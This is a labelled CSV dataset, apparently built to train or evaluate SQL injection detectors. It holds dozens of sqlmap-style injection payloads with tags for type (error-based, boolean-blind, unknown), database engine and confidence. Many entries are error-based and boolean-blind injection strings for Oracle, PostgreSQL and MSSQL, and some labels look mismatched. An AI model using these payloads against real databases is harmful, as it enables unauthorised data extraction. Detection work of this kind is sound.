id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39241,"select * from users WHERE username = ""1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-9564",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39242,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-7242\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39243,-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39244,"-9742 ) where 8409 = 8409 or username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39245,"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""-9987 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39246,"1\'|| ( select \'rjis\' from dual where 7696 = 7696 or username = ""-5863"" and username = ""1 ) ) and ( ( 5139 = 5139",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39247,"-3733\' ) ) or username = ""-6190\' ) where 2621 = 2621 or username = ""-5863"" and ""gkvy"" = ""gkvy",unknown,generic,0.50,Insufficient data to classify payload type,1
39248,"select * from users WHERE username = ""1"" or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39249,"select * from users WHERE username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" or username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39250,"select * from users WHERE username = ""-3185\' ) ) and ( ( \'rknd\' like \'rknd"" and username = ""-1889%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39251,-6203\' ) ) ) and ( ( ( \'luee\' = \'luee,unknown,generic,0.50,Insufficient data to classify payload type,1
39252,"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul"" and username = ""1%\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39253,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" or username = ""-2154%\'",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39254,"1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1\' ) where 1502 = 1502 and ( ( ( \'winx\' = \'winx",unknown,generic,0.50,Insufficient data to classify payload type,1
39255,"-3899\' ) where 8152 = 8152 and username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39256,"-9847%\' ) ) ) or username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 or username = ""1%",unknown,generic,0.50,Insufficient data to classify payload type,1
39257,"select * from users WHERE username = ""1%"" and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""1%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39258,"-5863"" and ( ( 5139 = 5139"" and username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39259,"1\' and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39260,"-7199\' and username = ""-9564 or username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39261,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""1\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39262,"-8828%\' ) ) ) or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39263,"select * from users WHERE username = ""1%\' ) ) ) and username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39264,"select * from users WHERE username = ""-5585\' and username = ""-5863"" and username = ""1 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39265,"select * from users WHERE username = ""1"" or username = ""1%\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\' ) ) )",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39266,"-9987 ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254",unknown,generic,0.50,Insufficient data to classify payload type,1
39267,"-9770\' ) ) as ovhh where 7903 = 7903 and username = ""1 ) ) ) and ( ( ( 4694 = 4694",unknown,generic,0.50,Insufficient data to classify payload type,1
39268,"select * from users WHERE username = ""1\' ) ) and ( ( \'yhku\' like \'yhku"" or username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39269,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' and \'foju\' = \'foju",unknown,generic,0.50,Insufficient data to classify payload type,1
39270,"1%\' ) ) ) and username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg",unknown,generic,0.50,Insufficient data to classify payload type,1
39271,"select * from users WHERE username = ""-5863"" and username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39272,"-2154%\' or username = ""-5863"" and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39273,1\' and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39274,"-5863"" and ""gkvy"" = ""gkvy"" or username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39275,"select * from users WHERE username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""-6353%\' ) ) and ( ( \'%\' = \'"" and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39276,"select * from users WHERE username = ""-7323%"" and username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39277,"select * from users WHERE username = ""-6720\' ) ) ) and ( ( ( \'enfe\' like \'enfe"" and username = ""1"" or username = ""1 ) as nbno where 9816 = 9816",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39278,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" or username = ""1\' ) where 1502 = 1502 or username = ""-1641\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39279,1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39280,"select * from users WHERE username = ""1"" and username = ""-3978 or username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39281,"select * from users WHERE username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-6523"" and username = ""-5062 ) where 7457 = 7457",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39282,"1\'|| ( select \'adiv\' from dual where 9842 = 9842 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39283,"select * from users WHERE username = ""-6720\' ) ) ) and ( ( ( \'enfe\' like \'enfe"" and username = ""1"" or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39284,"-2495 ) ) as hudw where 4197 = 4197 or username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39285,"1%\' ) ) or username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39286,"-1985 ) ) ) and ( ( ( 1248 = 1248"" and \'nmdq\' like \'nmdq",unknown,generic,0.50,Insufficient data to classify payload type,1
39287,"1\' where 8537 = 8537 or username = ""1 ) ) ) and username = ""-1549\' ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39288,"1"" and ( ( ( 6395 = 6395"" and username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39289,"select * from users WHERE username = ""-5863"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" or username = ""-2756\' where 6156 = 6156",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39290,"1 ) ) ) and username = ""-1549\' ) or username = ""-1254"" or username = ""1\' and ( ( 5616 = 5616",unknown,generic,0.50,Insufficient data to classify payload type,1
39291,"-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) ) as iihk where 5414 = 5414 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39292,"-5863"" and ""gkvy"" = ""gkvy"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""-6353%\' ) ) and ( ( ( \'mfmk\' = \'mfmk",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39293,"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul"" and username = ""-9501\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39294,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39295,"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39296,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39297,"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or username = ""1 ) ) as iihk where 5414 = 5414",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39298,1\' ) ) ) and ( ( ( \'iuki\' = \'iuki,unknown,generic,0.50,Insufficient data to classify payload type,1
39299,"select * from users WHERE username = ""1\' ) where 1502 = 1502 or username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39300,"select * from users WHERE username = ""1\' and username = ""-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39301,1 ) ) ) and ( ( ( 6395 = 6395,unknown,generic,0.50,Insufficient data to classify payload type,1
39302,"1\' or username = ""1"" or username = ""-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39303,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39304,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39305,"select * from users WHERE username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx"" or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39306,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku"" or username = ""-2756\' where 6156 = 6156",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39307,"1\' ) ) or username = ""1\' and username = ""1 ) ) and ( ( 5139 = 5139",unknown,generic,0.50,Insufficient data to classify payload type,1
39308,"1\' and username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39309,"select * from users WHERE username = ""-1641\' ) ) or username = ""-2733\' ) ) ) and username = ""-4952\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39310,"1 ) ) as iihk where 5414 = 5414 and username = ""1"" and ( ( ( \'qhdg\' = \'qhdg",unknown,generic,0.50,Insufficient data to classify payload type,1
39311,"select * from users WHERE username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-3859 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39312,"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and ( ( ( \'sbey\' = \'sbey"" and username = ""-7242\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39313,"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-1254"" and username = ""1\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39314,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'cbnc\' like \'cbnc"" or username = ""-4610\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39315,"-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39316,"1 ) ) or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1\' ) and ( \'ulkq\' = \'ulkq",unknown,generic,0.50,Insufficient data to classify payload type,1
39317,"-6190\' ) where 2621 = 2621 or username = ""1"" and \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39318,"1 and username = ""-6190\' ) where 2621 = 2621 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39319,"SELECT * FROM users WHERE username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge"" OR username = ""-9564",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39320,1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39321,"-6720\' ) ) ) or username = ""-6079 ) ) ) and ( ( ( 8708 = 8708",unknown,generic,0.50,Insufficient data to classify payload type,1
39322,"select * from users WHERE username = ""-1549\' ) and ( \'fnwx\' = \'fnwx"" or username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39323,"SELECT * FROM users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" OR username = ""1\'+ ( select vohg where 6383 = 6383",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39324,"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 or username = ""1%"" and username = ""-6353%\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39325,1\' and \'ixzr\' = \'ixzr,unknown,generic,0.50,Insufficient data to classify payload type,1
39326,"1\' ) where 1502 = 1502 and username = ""-6523"" and username = ""-7242\' and \'kfff\' = \'kfff",unknown,generic,0.50,Insufficient data to classify payload type,1
